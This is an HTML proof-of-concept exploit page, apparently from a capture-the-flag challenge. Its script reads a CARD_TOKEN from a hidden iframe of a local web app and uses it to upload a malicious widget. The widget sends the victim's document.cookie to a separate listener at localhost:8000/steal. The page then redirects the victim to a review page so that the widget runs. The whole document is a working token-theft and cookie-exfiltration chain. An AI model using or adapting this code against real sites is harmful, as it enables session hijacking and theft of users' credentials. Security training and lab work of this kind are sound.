<!DOCTYPE html>
<html>
<head>
    <title>poc</title>
</head>
<body>
<script>
(async () => {
    // iframe 로드
    const iframe = document.createElement('iframe');
    iframe.src = 'http://localhost:5000/preview';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    await new Promise(resolve => { iframe.onload = resolve; });
    // 토큰 획득
    const token = iframe.contentWindow.CARD_TOKEN;
    if (!token) {
        console.error('no token');
        return;
    }
    // 위젯 코드: flag 탈취
    const widgetCode = `fetch('http://localhost:8000/steal?c=' + encodeURIComponent(document.cookie));`;
    // 업로드
    const res = await fetch('http://localhost:5000/export', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/javascript',
            'X-Card-Token': token
        },
        body: widgetCode
    });
    const widgetName = await res.text();
    // 리다이렉트
    location.href = 'http://localhost:5000/review?widget=' + widgetName;
})();
</script>
</body>
</html>
